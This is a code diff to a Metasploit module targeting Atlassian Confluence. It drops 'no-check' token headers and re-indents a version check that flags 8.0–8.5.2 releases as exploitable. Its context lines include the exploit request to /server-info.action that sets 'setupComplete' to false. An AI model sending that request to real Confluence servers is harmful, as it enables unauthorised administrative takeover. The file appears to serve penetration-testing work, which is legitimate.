@@ -51,10 +51,7 @@ class MetasploitModule < Msf::Auxiliary
   def check
     res = send_request_cgi(
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, '/login.action'),
-      'headers' => {
-        'X-Atlassian-Token' => 'no-check'
-      }
+      'uri' => normalize_uri(target_uri.path, '/login.action')
     )
     return nil unless res&.code == 200
 
@@ -68,8 +65,8 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Detected Confluence version: #{confluence_version}")
 
     if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.3')) ||
-      confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.3')) ||
-      confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.2'))
+       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.3')) ||
+       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.2'))
       return Exploit::CheckCode::Appears("Exploitable version of Confluence: #{confluence_version}")
     end
 
@@ -80,9 +77,6 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, '/server-info.action'),
-      'headers' => {
-        'X-Atlassian-Token' => 'no-check'
-      },
       'vars_get' => {
         'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'
       }
